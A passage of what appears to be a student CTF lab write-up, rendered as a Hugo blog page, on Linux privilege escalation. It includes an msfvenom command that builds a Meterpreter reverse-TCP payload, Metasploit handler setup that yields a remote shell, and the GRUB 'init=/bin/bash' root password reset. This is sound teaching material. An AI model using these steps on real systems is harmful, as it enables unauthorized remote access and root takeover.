+<h4 id="trying-a-kernel-level-exploit">Trying a kernel level exploit<a hidden class="anchor" aria-hidden="true" href="#trying-a-kernel-level-exploit">#</a></h4>
+<p>We also tried a kernel exploit from exploit-db out of desperation, which failed at compiling.<!-- raw HTML omitted -->exploitdb<sup id="fnref:16"><a href="#fn:16" class="footnote-ref" role="doc-noteref">16</a></sup><!-- raw HTML omitted --></p>
+<h4 id="trying-to-get-privileges-using-metasploit-and-meterpreter">Trying to get privileges using Metasploit and Meterpreter<a hidden class="anchor" aria-hidden="true" href="#trying-to-get-privileges-using-metasploit-and-meterpreter">#</a></h4>
+<p>Lastly, we tried to use Meterpreter and its prebuilt privilege escalation modules.<!-- raw HTML omitted -->linux-reverse-tcp<sup id="fnref:17"><a href="#fn:17" class="footnote-ref" role="doc-noteref">17</a></sup><!-- raw HTML omitted --><!-- raw HTML omitted -->metasploit-local-exploiter-suggestor<sup id="fnref:18"><a href="#fn:18" class="footnote-ref" role="doc-noteref">18</a></sup><!-- raw HTML omitted --></p>
+<p>To do this, we had to generate a payload first. The payload was generated with the following command:<br>
+<code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=[IP] LPORT=4444 -f elf -o payload.bin</code><!-- raw HTML omitted -->msfvenomdocs<sup id="fnref:19"><a href="#fn:19" class="footnote-ref" role="doc-noteref">19</a></sup><!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>-p linux/x86/meterpreter/reverse_tcp <span style="color:#75715e">#setting the payload to be reverse TCP for Linux x86</span>
+</span></span><span style="display:flex;"><span>LHOST<span style="color:#f92672">=[</span>IP<span style="color:#f92672">]</span> <span style="color:#75715e"># sets IP address of the attacking machine</span>
+</span></span><span style="display:flex;"><span>LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">4444</span> <span style="color:#75715e">#sets the local port to listen for a connection</span>
+</span></span><span style="display:flex;"><span>-f elf <span style="color:#75715e">#specifies the output format</span>
+</span></span><span style="display:flex;"><span>-o payload.bin <span style="color:#75715e">#specifies the output filename</span>
+</span></span></code></pre></div><figure>
+    <img loading="lazy" src="/itsi/y3/ex7/images/msfgenpayload.png"/> <figcaption>
+            Figure 27: Generating the payload using msfvenom
+        </figcaption>
+</figure>
+
+<p>After this, the payload is uploaded to the target using scp, as demonstrated in Figure 28.</p>
+<figure>
+    <img loading="lazy" src="/itsi/y3/ex7/images/scp.png"/> <figcaption>
+            Figure 28: Uploading the payload to the target
+        </figcaption>
+</figure>
+
+<p>The next step is to open the Metasploit console by running <code>msfconsole</code>. Set the exploit to <code>exploit/multi/handler</code>, the payload to <code>linux/x86/meterpreter/reverse_tcp</code>, the LHOST to <code>192.168.15.4</code>, and finally, run the command <code>run</code> to start the reverse TCP handler. After that, we execute the binary on the target, and we have a Meterpreter shell, as shown in Figures 29 and 30.</p>
+<p><figure>
+    <img loading="lazy" src="/itsi/y3/ex7/images/msfc.png"/> <figcaption>
+            Figure 29: Running the necessary commands in the msfconsole
+        </figcaption>
+</figure>
+
+<figure>
+    <img loading="lazy" src="/itsi/y3/ex7/images/ep.png"/> <figcaption>
+            Figure 30: Executing the payload on the target
+        </figcaption>
+</figure>
+</p>
+<p>Now that we have access to Meterpreter, we can use commands such as <code>getuid</code> to get the ID of the user and many other useful commands such as <code>upload</code> and <code>download</code>. However, as demonstrated in Figure 31, loading the priv module didn&rsquo;t work, so we were not able to test if <code>getsystem</code> would work to escalate the privileges.</p>
+<figure>
+    <img loading="lazy" src="/itsi/y3/ex7/images/RadagJuice.png"/> <figcaption>
+            Figure 31: The required modules not being loaded
+        </figcaption>
+</figure>
+
+<hr>
+<h3 id="getting-root-access-through-editing-the-grub-boot-options">Getting root access through editing the GRUB boot options<a hidden class="anchor" aria-hidden="true" href="#getting-root-access-through-editing-the-grub-boot-options">#</a></h3>
+<p>Since we weren&rsquo;t able to gain access, we resorted to the good old and reliable GRUB root password reset.<!-- raw HTML omitted -->root-grub<sup id="fnref:20"><a href="#fn:20" class="footnote-ref" role="doc-noteref">20</a></sup><!-- raw HTML omitted --></p>
+<p>To use this method, the system needs to be running the GRUB boot loader, which is the default for Ubuntu.</p>
+<p>It is performed by pressing <code>e</code> when seeing the screen shown in Figure 32, which brings up the menu to edit the boot commands.</p>
+<figure>
+    <img loading="lazy" src="/itsi/y3/ex7/images/pe.png"/> <figcaption>
+            Figure 32: Showing the GRUB screen to press e on
+        </figcaption>
+</figure>
+
+<p>Then navigate to the line starting with <code>linux</code> and append <code>rw init=/bin/bash</code>, as shown in Figure 33, to change a kernel parameter. After pressing F10, you will immediately boot into the system with a root shell, as shown in Figure 34.</p>
+<p><figure>
+    <img loading="lazy" src="/itsi/y3/ex7/images/rw&#43;.png"/> <figcaption>
+            Figure 33: Editing a kernel parameter
+        </figcaption>
+</figure>
+
+<figure>
+    <img loading="lazy" src="/itsi/y3/ex7/images/pwc.png"/> <figcaption>
+            Figure 34: Changing the root password
+        </figcaption>
+</figure>
+</p>
+<p>Lastly, as displayed in Figure 34, we run the command <code>exec /sbin/init</code> to reboot the system and load into the operating system as usual. Figure 35 verifies this by showing the root login after rebooting.</p>
+<figure>
+    <img loading="lazy" src="/itsi/y3/ex7/images/ve.png"/> <figcaption>
+            Figure 35: Logging in as the root user
+        </figcaption>
+</figure>
+
+<hr>
+<h3 id="obtaining-the-final-flag">Obtaining the final flag<a hidden class="anchor" aria-hidden="true" href="#obtaining-the-final-flag">#</a></h3>
+<p>Now that we are the root user, we can see a file called <code>root_flag.txt</code>, which contains the final flag. Additionally, we can view the file <code>ctf_setup.sh</code> to see how the CTF is made and verify that we actually got all of the flags this time. These files are also available in the ZIP file beside this document. Figure 36 shows the files in <code>/root</code> and the final flag.</p>
+<figure>
+    <img loading="lazy" src="/itsi/y3/ex7/images/ogm.png"/> <figcaption>
+            Figure 36: Viewing the final flag in the /root directory
+        </figcaption>
+</figure>
+
+<hr>
+<h2 id="references">References<a hidden class="anchor" aria-hidden="true" href="#references">#</a></h2>
+<p><em>For a full bibliography, see the <a href="https://github.com/Stefanistkuhl/goobering/blob/master/itsi/y3/ex7/quellen.bib">original BibTeX file</a>.</em></p>
+<div class="footnotes" role="doc-endnotes">
+<hr>
+<ol>
+<li id="fn:1">
+<p>This task definition and summary were generated using ChatGPT from the original bullet points.&#160;<a href="#fnref:1" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
+</li>
+<li id="fn:2">
+<p>Lockheed Martin. Cyber Kill Chain®. <a href="https://www.lockheedmartin.com/en-us/capabilities/cyber/cyber-kill-chain.html">source</a>&#160;<a href="#fnref:2" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
+</li>
+<li id="fn:3">
+<p>Nmap. Service and Version Detection. <a href="https://nmap.org/book/man-version-detection.html">source</a>&#160;<a href="#fnref:3" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
+</li>
+<li id="fn:4">
+<p>Nmap. Timing Templates (-T). <a href="https://nmap.org/book/performance-timing-templates.html">source</a>&#160;<a href="#fnref:4" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
+</li>
+<li id="fn:5">
+<p>10-million-password-list-top-10000.txt. <a href="https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/10-million-password-list-top-10000.txt">source</a>&#160;<a href="#fnref:5" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
+</li>
+<li id="fn:6">
+<p>Code Zen. Defeating HTTP Basic Auth with Hydra. <a href="https://tylerrockwell.github.io/defeating-basic-auth-with-hydra">source</a>&#160;<a href="#fnref:6" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
+</li>
+<li id="fn:7">
+<p>GeeksforGeeks. How to use Hydra to BruteForce SSH Connections? <a href="https://www.geeksforgeeks.org/how-to-use-hydra-to-brute-force-ssh-connections">source</a>&#160;<a href="#fnref:7" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
+</li>
+<li id="fn:8">
+<p>Ask Ubuntu. What does 2&gt;/dev/null mean? <a href="https://askubuntu.com/questions/350208/what-does-2-dev-null-mean">source</a>&#160;<a href="#fnref:8" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
+</li>
+<li id="fn:9">
+<p>GeeksforGeeks. find command in Linux Linux Tutorial. <a href="https://www.geeksforgeeks.org/find-command-in-linux-with-examples">source</a>&#160;<a href="#fnref:9" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
+</li>
+<li id="fn:10">
+<p>Uppin, C. M. Series of CTF machines Walkthrough #4 Linux Privilege Escalation (Enumeration). <a href="https://medium.com/techiepedia/series-of-ctf-machines-walkthrough-4-linux-privilege-escalation-enumeration-247899027be">source</a>&#160;<a href="#fnref:10" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a>&#160;<a href="#fnref1:10" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
+</li>
+<li id="fn:11">
+<p>Delinea. Linux Privilege Escalation. <a href="https://delinea.com/blog/linux-privilege-escalation">source</a>&#160;<a href="#fnref:11" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
+</li>
+<li id="fn:12">
+<p>Uppin, C. M. Series of CTF machines Walkthrough #5 Linux Privilege Escalation using Kernel Exploit. <a href="https://cmuppin9.medium.com/series-of-ctf-machines-walkthrough-5-linux-privilege-escalation-using-kernel-exploit-e188970fb905">source</a>&#160;<a href="#fnref:12" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
+</li>
+<li id="fn:13">
+<p>Uppin, C. M. Series of CTF machines Walkthrough #7 Linux Privilege Escalation using SUID permissions. <a href="https://cmuppin9.medium.com/series-of-ctf-machines-walkthrough-7-linux-privilege-escalation-using-suid-permissions-7f82335e7547">source</a>&#160;<a href="#fnref:13" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
+</li>
+<li id="fn:14">
+<p>Uppin, C. M. Series of CTF machines Walkthrough #6 Linux Privilege Escalation using SUDO permissions. <a href="https://cmuppin9.medium.com/series-of-ctf-machines-walkthrough-6-linux-privilege-escalation-using-sudo-permissions-c517cb789bc6">source</a>&#160;<a href="#fnref:14" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
+</li>
+<li id="fn:15">
+<p>linux-smart-enumeration. <a href="https://github.com/diego-treitos/linux-smart-enumeration">source</a>&#160;<a href="#fnref:15" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
+</li>
+<li id="fn:16">
+<p>Qualys Corporation. Linux Kernel - &rsquo;ldso_hwcap Stack Clash&rsquo; Local Privilege Escalation. <a href="https://www.exploit-db.com/exploits/42274">source</a>&#160;<a href="#fnref:16" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
+</li>
+<li id="fn:17">
+<p>metasploit-framework/documentation/modules/payload/linux/x86/meterpreter/reverse_tcp.md at master · rapid7/metasploit-framework. <a href="https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/payload/linux/x86/meterpreter/reverse_tcp.md">source</a>&#160;<a href="#fnref:17" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
+</li>
+<li id="fn:18">
+<p>drd_. Null Byte. <a href="https://null-byte.wonderhowto.com/how-to/get-root-with-metasploits-local-exploit-suggester-0199463">source</a>&#160;<a href="#fnref:18" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
+</li>
+<li id="fn:19">
+<p>Metasploit Documentation. How to use msfvenom. <a href="https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html">source</a>&#160;<a href="#fnref:19" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
+</li>
+<li id="fn:20">
+<p>LinuxConfig. Recover - Reset Forgotten Linux Root Password. <a href="https://linuxconfig.org/recover-reset-forgotten-linux-root-password">source</a>&#160;<a href="#fnref:20" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
+</li>
+</ol>
+</div>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="http://localhost:1313/tags/linux/">Linux</a></li>
+      <li><a href="http://localhost:1313/tags/it-sec/">It Sec</a></li>
+      <li><a href="http://localhost:1313/tags/school/">School</a></li>
+      <li><a href="http://localhost:1313/tags/red-team/">Red Team</a></li>
+      <li><a href="http://localhost:1313/tags/ctf/">Ctf</a></li>
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2025 <a href="http://localhost:1313/"></a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
